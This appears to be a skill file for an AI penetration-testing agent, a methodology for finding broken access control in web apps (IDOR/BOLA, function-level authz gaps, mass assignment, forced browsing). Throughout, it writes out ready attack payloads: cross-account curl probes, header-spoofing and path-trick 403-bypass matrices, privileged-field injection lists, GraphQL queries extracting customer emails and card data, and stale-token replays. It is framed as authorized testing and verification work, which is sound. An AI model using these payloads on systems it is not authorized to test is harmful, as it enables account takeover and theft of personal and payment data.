---
name: Access Control & Authorization Testing
description: Retrieve or modify another principal's data and reach privileged functionality via IDOR/BOLA, function-level authz gaps, mass assignment, and forced browsing.
tags: [web, access-control, idor, bola, authz, owasp-a01]
recommended_tools: [http_request, http_repeater, http_intruder, ffuf_scan, arjun_parameter_discovery]
vuln_classes: [idor]
domain: web
phase: exploitation
---
# Access Control & Authorization Testing

Broken access control is OWASP #1 and scanners miss it — it is **logic testing** done by hand with
`http_request`/`http_repeater`. The non-negotiable setup: **two unrelated identities**. Account A
(attacker) and Account B (victim) must be genuinely different principals — different users, ideally
different tenants/roles. Perform actions as A, record every object id you own; then try to reach B's
objects using A's session.

> Verifier rule — **IDOR/access-control is ONLY confirmed when you retrieve or modify ANOTHER
> principal's data, reproduced with TWO unrelated identities.** Accessing your *own* account's data
> by id is **self-IDOR = NOT a finding**. The proof must show A's credentials returning B's data, and
> the same swap reproduced (e.g. B's session reaching A's object) to rule out a shared/test fixture.

## 1. Numeric & UUID id swaps (`http_repeater`)
Where: `?id=`, `/users/123`, `/orders/{uuid}`, JSON bodies, GraphQL variables, WebSocket frames, hidden
form fields. Inventory ids while logged in as A.
- Numeric: replay A's request substituting B's id; also try `+1/-1/0` and large values to find live
  neighbours. `http_intruder` to sweep a range, filtering on success status/length.
- UUID/GUID/hash: you usually need B's actual id — capture it from B's session, a share link, an email,
  or an enumerable list endpoint. Swap especially on **PUT/DELETE/PATCH** (write IDOR > read IDOR).
- Run every swap across **GET, PUT, POST, DELETE, PATCH** — read auth and write auth are often separate.

## 2. Vertical escalation / BFLA (function & method) (`http_request`)
- **Forced browsing** — as low-priv A, hit admin/internal paths not linked in the UI: `/admin`,
  `/admin/export`, `/api/internal/*`, `/actuator`, `/api/v1/admin/*`. Discover with `ffuf_scan`.
- **Method swap (BFLA)** — an endpoint may authorize `GET` but not `DELETE`/`PUT`. Re-send the
  privileged verb. Also try header overrides when only POST is allowed:
  `X-HTTP-Method-Override: DELETE`, `X-Method-Override: PUT`, `X-Original-Method: PATCH`.
- **The sibling rule** — if 9 of 10 `/admin/*` endpoints enforce auth and the 10th returns data
  unauthenticated, that 10th is the bug. Compare authed vs anonymous responses to the same path.

## 3. Parameter pollution & tampering (`http_request`)
- HTTP parameter pollution: `?user_id=A&user_id=B` (or in body) — front-end/WAF and backend may pick
  different copies, smuggling B's id past the authz layer.
- Role/flag tampering: flip `role=user`→`admin`, `isAdmin=false`→`true`, `account_id`, `tenant_id`,
  `org=` in query/body/JWT claims (see authentication-testing for JWT).

## 4. Mass assignment (`http_request`)
GET the object to enumerate its fields, then PATCH/PUT with fields the UI never sends —
`{"role":"admin"}`, `{"is_admin":true}`, `{"verified":true}`, `{"user_id":<B>}`, `{"balance":99999}`.
If they persist (re-GET to confirm), you write outside your privilege. Use `arjun_parameter_discovery`
to surface hidden/accepted params.

## 5. API version & path downgrade
Re-issue the request against `/api/v1/`, `/v2/`, `/internal/`, `/legacy/`. Older/internal versions
often omit the authz middleware present on the current path — same data, no check.

## Ordered method
1. As A, capture a baseline: which objects/actions you legitimately own and their ids.
2. As A, swap in B's id / hit B's resource / call the privileged function. Note the response.
3. **Reproduce with the second identity** (B reaching A's object, or a third id) — this is what the
   verifier requires; one-sided self-access does not count.
4. Diff: what A *should* see vs what A actually got.

## Proof to capture
The exact request (A's session/token), the swapped identifier/parameter (the payload), and the raw
response containing **B's data or evidence of B's object being modified** — plus the reproducing swap.
Read, don't destroy; destructive cross-user actions need approval. CWE-639 (IDOR) / CWE-285 (authz) /
CWE-862 (missing function-level authz) / CWE-915 (mass assignment).


<!-- Ingested from reference frameworks (skill-ingestion) -->
## Two-identity swap harness with existence-oracle (blind cross-account)
Provision TOK_A (owner) and TOK_B (attacker). Capture a response signature on owned vs foreign IDs so enumeration works even when bodies are masked.
```
curl -s -o /dev/null -w "%{http_code}|%{size_download}|%{time_total}|%{header_etag}\n" \
  -H "Authorization: Bearer ${TOK_B}" "https://target/api/objects/<A_ID>"
```
Decode opaque/Relay IDs and increment the inner integer:
```
echo "VXNlcjo0NTY=" | base64 -d   ->  User:456    ;    echo -n "User:457" | base64
```
IDOR proof modes (deterministic):
- Differential read: two unrelated throwaway accounts both read the SAME victim record (`id_field==expect_id`) -> broken object authz.
- Sequential walk: one session reads 2+ records returning 200 with DIFFERENT identity fields (email/username) -> broken authz.
- Owner re-read: TOK_B mutates a foreign object and the change persists when re-read as TOK_A (Level 3).

Proof signal: TOK_B receives Account A private fields (email/billing/PII), OR one session reads 2+ records with differing identity fields all HTTP 200.

## BFLA 403-bypass matrix (gateway-vs-handler authz gaps)
```
verb drift:      GET/POST/PUT/PATCH/DELETE/OPTIONS on same route; ?_method=PUT; X-HTTP-Method-Override: DELETE
path tricks:     /api/admin/users/123/promote.  |  /api/admin//users/...  |  /api/Admin/...  |  /api/admin/...;.css  |  /api%2Fadmin/...
rewrite headers: X-Original-URL / X-Rewrite-URL / X-Forwarded-Path / X-Override-URL: /api/admin/...
identity headers:X-User-Id: 1  |  X-User-Role: admin  |  X-Roles: admin  |  X-Forwarded-User: admin@target  |  X-On-Behalf-Of: 1
IP allowlist:    X-Forwarded-For: 127.0.0.1  |  X-Real-IP: 127.0.0.1  |  Forwarded: for=127.0.0.1
content-type:    resend JSON-blocked body as form-encoded / multipart / application/xml
GraphQL alias:   { benign: me{id}  promote: updateUser(id:"X", role: ADMIN){id role} }
```
Disjoint-evidence proof (required before EXPLOITED): the low-priv actor succeeds AND a true non-permitted actor returns 401/403 on the IDENTICAL request. Exactly one bypass variant flips to success while the baseline non-permitted actor still gets 401/403.

## Mass-assignment privileged-field dictionary + shape rotation
GET the resource, ship one forbidden key per request across encodings, GET again to diff.
```
priv:        role, roles[], isAdmin, is_admin, permissions, verified, emailVerified, kycVerified
ownership:   userId, ownerId, accountId, organizationId, tenantId, workspaceId, createdBy
entitlement: plan, tier, premium, features, flags, seatCount, creditBalance, betaAccess
billing:     price, amount, currency, prorate, trialEnd, nextInvoice
shapes:      JSON, form, multipart, dot (profile.role), bracket (settings[roles][]), duplicate JSON keys
JSON-Patch:  [{"op":"replace","path":"/role","value":"admin"}]  with  Content-Type: application/json-patch+json
tenant swap: -H "X-Tenant-ID: <A_TENANT_ID>"
```
Tooling: `arjun -u https://target/api/users/me -m JSON --stable` to mine accepted params.
Proof signal: follow-up GET shows the privileged field persisted (before/after diff) that the low-priv caller cannot legitimately grant.

## Guard-dominance rule (white-box)
A route is vulnerable if any side effect (DB read/write of a user/org object, cross-tenant access, payment capture, role change) is reached BEFORE a guard that DOMINATES all code paths. Guards AFTER the side effect and UI-only checks (hidden buttons, disabled forms, client-side role checks) do NOT count. Authentication != authorization.

## Modern techniques & real-world CVEs (via recon-skills)

Synthesized from 26 disclosed HackerOne/bug-bounty IDOR reports. Only additive material below — the two-identity harness, verb drift, mass assignment, and HPP bypasses above still apply.

### Disclosed report ledger (Relay GID & double-IDOR chains)
Concrete high-payout shapes to pattern-match against the target:
- **Shopify Billing IDOR** — H1 #2207248 ($5,000). Relay `node(id:)` resolver auths the caller but nested relations don't re-check ownership of the resolved object.
- **HackerOne `PolicyPageAssetGroup` IDOR** — H1 #1618347 ($25,000). GraphQL object-level authz gap.
- **Shopify undocumented `fileCopy` mutation** — H1 #981472 (2020, $2,000). Undocumented mutation reachable cross-tenant.
- **Stripe `UpdateAtlasApplicationPerson`** — H1 #1066203 (2020). Cross-tenant mutation without ownership check.
These recur as: (1) Relay `node(id:)` nested-relation traversal for mass PII/financial extraction, and (2) IDOR on `POST /teams/{id}/members` + mass-assignment of `role:OWNER` for cross-tenant privilege escalation.

### GraphQL Relay global-ID (GID) enumeration
Relay/base64 global IDs decode to `type:integer` — decode, increment the inner int, re-encode, and walk. The top-level `node()` resolver may auth the requester while nested relations skip re-checking ownership of the resolved node:
```bash
echo "VXNlcjo0NTY=" | base64 -d      # -> User:456
echo -n "User:457" | base64          # -> re-encode neighbour
# gid://shopify/Customer/<n> patterns: bump <n>, re-issue node() query
```
```graphql
node(id:"<victim_gid>") {
  ... on Customer { email orders { totalPrice paymentMethods { cardLast4 } } }
}
```
Introspect first to enumerate every mutation taking an `id:` argument, then fan out victim IDs across `updateUser`/`deleteOrg`/`transferBilling`:
```graphql
{ __schema { mutationType { fields { name args { name } } } } }
```

### Temporal / soft-delete IDOR (post-removal token validity)
Authorization checked at grant time, not at access time. A "remove member" or "revoke" flow that flips `active=false` but never invalidates the session/PAT leaves cached auth context valid:
```bash
# capture PAT/cookie BEFORE removal, then after org-admin removes the user:
curl -s -H "Authorization: Bearer $STALE_PAT" https://target/api/orgs/<org>/data
# still 200 = temporal IDOR (weeks of post-termination cross-tenant access)
```
Same class covers expired invites/reset tokens still accepted after the granting permission is revoked. Impact: GDPR/CCPA breach exposure.

### Root-cause grep (white-box / leaked source)
Missing per-user scoping in ORM lookups is the canonical IDOR root cause. Fetch-by-id without a user/tenant predicate = bug:
```bash
grep -rn "findById\|findOne\|getById" --include=*.js .
grep -rn "params\[:id\]\|params\['id'\]" --include=*.rb .
grep -rn "request\.args\.get('id')" --include=*.py .
# secure shape scopes the query:  Model.findOne({ _id: params.id, userId: req.user.id })
```

### Additional bypass ladder (after a 403 on direct swap)
Beyond `?id=own&id=victim` HPP already documented:
```
nested-JSON wrapper:   {"data":{"id":"VICTIM_ID"}}
param-name variants:   user_id | userId | uid | account | account_id
opaque-ref harvest:    scrape IDs from Location headers, error bodies, webhooks,
                       notification emails, and JS bundles, then replay elsewhere
version downgrade:      retry the SAME call on /v1/ when /v2/ enforces authz
```
```bash
# mine foreign UUIDs leaked in JS bundles / API responses
curl -s https://target/static/app.js | grep -Eo '"id":"[a-f0-9-]{36}"' | sort -u
```

### High-value target triage (payout-weighted)
Prioritize object references on: financial/billing documents (PII + payment data), private repositories/source (`migration_id` on import endpoints — GitHub-style private-repo read), private messages/DMs (may leak session/verification tokens → escalate read-IDOR to ATO), account-management endpoints, and cross-org/business admin (`org_id`/`business_id`/`voucher_id`).

### Gate 0 — 200-but-no-data guard
The #1 false-positive/N-A driver: an IDOR returning **200 OK** with an empty array, redacted fields, or an "access denied" message in the body. Before claiming EXPLOITED, confirm the response actually contains the victim's identity fields (email/PII/billing) — not just a success status. CWE-639 / CWE-285 / CWE-863 (incorrect authorization).
